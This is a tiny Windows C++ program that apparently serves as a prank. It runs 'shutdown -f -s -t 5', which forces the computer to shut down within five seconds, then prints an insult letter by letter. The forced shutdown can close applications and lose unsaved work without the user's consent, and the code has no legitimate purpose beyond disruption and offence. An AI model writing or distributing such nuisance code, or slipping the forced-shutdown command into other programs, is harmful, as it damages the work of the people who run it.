#include <windows.h>

#include <cstdio>
using namespace std;
int main() {
  char str[9] = "FuckYou!";
  system("shutdown -f -s -t 5");
  for (int i = 0; i <= 8; i++) {
    printf("%c", str[i]);
    Sleep(500);
  }
  return 0;
}
